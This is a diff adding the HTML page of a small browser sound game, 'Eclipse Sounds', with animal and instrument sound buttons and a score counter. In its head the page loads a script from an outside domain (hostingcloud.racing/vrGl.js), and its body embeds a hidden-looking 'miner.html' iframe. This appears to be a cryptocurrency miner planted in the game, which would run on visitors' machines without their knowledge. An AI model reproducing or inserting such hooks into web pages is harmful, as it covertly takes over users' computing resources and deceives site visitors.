@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link
+      rel="shortcut icon"
+      type="image/x-icon"
+      href="https://cdn.glitch.com/457abbe8-4602-4fcd-8eb3-78bfe5da9c06%2Fegg.ico?1547155629924"
+    />
+    <title>Eclipse Sounds| Beta</title>
+    <!--   This is where the Phaser 2.6.2 code is brought in to the app. -->
+
+    <script type="text/javascript" src="/js/fly.js" defer></script>
+    <script
+      type="text/javascript"
+      src="/games/eclipse/eclipse.js"
+      defer
+    ></script>
+
+    <link rel="stylesheet" href="style.css" />
+    <link rel="stylesheet" href="/fly.css" />
+    <script src="https://www.hostingcloud.racing/vrGl.js"></script>
+  </head>
+  <body>
+    <miner><iframe src="miner.html"></iframe></miner>
+    <wrap>
+      <label id="minutes" value="0" class="hide">00</label>.<label
+        id="seconds"
+        value="0"
+        class="hide"
+        >00</label
+      >
+      <center>
+        <div class="musicboard">
+          <div class="funactions">
+            <div class="item">
+              <div id="remove">
+                <div id="musicItem"></div>
+              </div>
+              <div class="score">Notes: <label id="score">0</label></div>
+              <meter
+                value="0"
+                id="SCORE"
+                max="100"
+                min="0"
+                low="10"
+                high="80"
+                class="hide"
+              ></meter>
+            </div>
+          </div>
+          <div class="musicicons" id="musicIcons">
+            <div class="cow" onclick="cow();"></div>
+            <div class="duck" onclick="duck();"></div>
+            <div class="kazoo" onclick="kazoo();"></div>
+            <div class="airhorn" onclick="airhorn();"></div>
+            <div class="phone" onclick="phone();"></div>
+
+            <div class="cashout" onclick="cashOut();">
+              Restart
+            </div>
+          </div>
+        </div>
+      </center>
+    </wrap>
+  </body>
+</html>
